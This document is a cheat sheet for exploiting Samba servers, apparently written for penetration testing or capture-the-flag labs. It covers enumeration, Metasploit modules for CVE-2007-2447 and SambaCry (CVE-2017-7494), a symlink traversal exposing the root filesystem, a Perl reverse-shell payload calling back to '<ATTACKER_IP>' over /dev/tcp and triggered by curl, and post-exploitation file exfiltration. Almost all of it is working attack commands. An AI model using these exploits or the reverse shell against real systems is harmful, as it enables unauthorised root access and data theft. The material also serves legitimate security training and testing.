

## **Initial Enumeration**

1. **Detect Samba Service and Version:**
    
    ```bash
    nmap --script smb-os-discovery -p445 <TARGET_IP>
    ```
    
    - **Output:** Samba version (e.g., Samba 3.0.20).
2. **Search for Vulnerabilities:**
    
    ```bash
    searchsploit samba <VERSION>
    ```
    
    - Example: `searchsploit samba 3.0.20`.

---

## **Exploitation Techniques**

### **1. CVE-2007-2447 - Username Map Script Command Execution**

- **Affected Versions:** Samba 3.0.0 to 3.0.25rc3.
    
- **Exploit with Metasploit:**
    
    ```bash
    msf> use exploit/multi/samba/usermap_script
    msf exploit(usermap_script) > set RHOST <TARGET_IP>
    msf exploit(usermap_script) > set LHOST <ATTACKER_IP>
    msf exploit(usermap_script) > exploit
    ```
    
- **Result:** Root shell access.
    
- **Stabilize Shell:**
    
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    

---

### **2. Samba Symlink Directory Traversal**

1. **Check Shares for Write Permissions:**
    
    ```bash
    smbmap -H <TARGET_IP>
    ```
    
    - Example Output: `WRITE Access Found on 'tmp' Share`.
2. **Exploit with Metasploit:**
    
    ```bash
    msf> use auxiliary/admin/smb/samba_symlink_traversal
    msf auxiliary(samba_symlink_traversal) > set RHOST <TARGET_IP>
    msf auxiliary(samba_symlink_traversal) > set SHARE tmp
    msf auxiliary(samba_symlink_traversal) > run
    ```
    
3. **Access Symlinked Root Filesystem:**
    
    ```bash
    smbclient //TARGET_IP/tmp -N
    cd rootfs
    ls
    ```
    

---

### **3. Writable Share for Reverse Shell**

1. **Identify Writable Shares:**
    
    ```bash
    smbmap -H <TARGET_IP>
    ```
    
    - Example Writable Share: `www`.
2. **Test Write Permissions:**
    
    ```bash
    smbclient //TARGET_IP/www -N
    put test.txt
    ```
    
3. **Upload Reverse Shell:**
    
    - Prepare Payload:
        
        ```perl
        #!/usr/bin/perl
        print "Content-type: text/html\n\n";
        system("/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1");
        ```
        
    - Upload using `smbclient`:
        
        ```bash
        put shell.pl
        ```
        
4. **Trigger Reverse Shell:**
    
    ```bash
    curl http://<TARGET_IP>:<PORT>/shell.pl
    ```
    
### **4. CVE-2017-7494 - SambaCry**

- **Affected Versions:** Samba 3.5.0 to 4.6.4.
    
- **Exploit with Metasploit:**
    
    ```bash
    msf> use exploit/linux/samba/is_known_pipename
    msf exploit(is_known_pipename) > set RHOST <TARGET_IP>
    msf exploit(is_known_pipename) > set PAYLOAD cmd/unix/reverse_netcat
    msf exploit(is_known_pipename) > exploit
    ```
    
## **Post-Exploitation**

1. **List Shares & Permissions:**
    
    ```bash
    smbmap -H <TARGET_IP>
    ```
    
2. **Access Shares:**
    
    ```bash
    smbclient //<TARGET_IP>/<SHARE_NAME> -N
    ```
    
3. **Data Exfiltration:**
    
    ```bash
    smb: \> get <FILE>
    ```
    

---
